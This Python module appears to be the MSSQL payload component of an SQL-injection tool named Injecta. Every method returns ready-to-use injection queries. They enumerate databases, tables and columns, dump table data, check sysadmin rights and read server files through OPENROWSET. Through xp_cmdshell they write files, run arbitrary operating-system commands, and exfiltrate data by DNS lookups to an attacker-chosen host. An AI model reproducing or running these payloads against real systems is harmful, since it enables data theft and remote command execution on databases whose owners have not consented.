"""
Injecta — MSSQL payload provider
"""
from typing import List


class MSSQLPayloads:
    name = "mssql"
    comment = "--"
    inline_comment = "/*!*/"
    substitution_char = "s"

    @staticmethod
    def version() -> List[str]:
        return [
            "SELECT @@version",
        ]

    @staticmethod
    def databases() -> List[str]:
        return [
            "SELECT STRING_AGG(name, ',') FROM sys.databases",
            "SELECT STUFF((SELECT ',' + name FROM sys.databases FOR XML PATH('')),1,1,'')",
        ]

    @staticmethod
    def tables(db: str) -> List[str]:
        return [
            f"SELECT STRING_AGG(table_name, ',') FROM {db}.information_schema.tables",
            f"SELECT STUFF((SELECT ',' + table_name FROM {db}.information_schema.tables FOR XML PATH('')),1,1,'')",
        ]

    @staticmethod
    def columns(db: str, table: str) -> List[str]:
        return [
            f"SELECT STRING_AGG(column_name, ',') FROM information_schema.columns WHERE table_name='{table}'",
            f"SELECT STUFF((SELECT ',' + column_name FROM information_schema.columns WHERE table_name='{table}' FOR XML PATH('')),1,1,'')",
        ]

    @staticmethod
    def dump_column(db: str, table: str, column: str, limit: int = 0) -> List[str]:
        if limit > 0:
            return [f"SELECT TOP {limit} {column} FROM {db}..{table}"]
        return [f"SELECT {column} FROM {db}..{table}"]

    @staticmethod
    def current_user() -> List[str]:
        return ["SELECT CURRENT_USER", "SELECT SYSTEM_USER"]

    @staticmethod
    def current_db() -> List[str]:
        return ["SELECT DB_NAME()"]

    @staticmethod
    def count_tables(db: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {db}.information_schema.tables"]

    @staticmethod
    def count_columns(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{table}'"]

    @staticmethod
    def count_rows(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {db}..{table}"]

    @staticmethod
    def banner() -> List[str]:
        return ["SELECT @@version"]

    @staticmethod
    def is_dba() -> List[str]:
        return ["SELECT is_srvrolemember('sysadmin')"]

    @staticmethod
    def is_admin() -> List[str]:
        return ["SELECT is_srvrolemember('sysadmin')"]

    @staticmethod
    def privileges() -> List[str]:
        return ["SELECT permission_name FROM fn_my_permissions(NULL, 'DATABASE')"]

    @staticmethod
    def file_read(path: str) -> List[str]:
        return [
            f"SELECT * FROM OPENROWSET(BULK N'{path}', SINGLE_CLOB) AS data",
        ]

    @staticmethod
    def file_write(path: str, content: str) -> List[str]:
        escaped = content.replace("'", "''")
        return [
            f"EXEC xp_cmdshell 'echo {escaped} > {path}'",
        ]

    @staticmethod
    def os_cmd(cmd: str) -> List[str]:
        return [
            f"EXEC xp_cmdshell '{cmd}'",
        ]

    @staticmethod
    def oob_call(target: str, data: str) -> List[str]:
        return [
            f"EXEC xp_cmdshell 'nslookup {data}.{target}'",
        ]
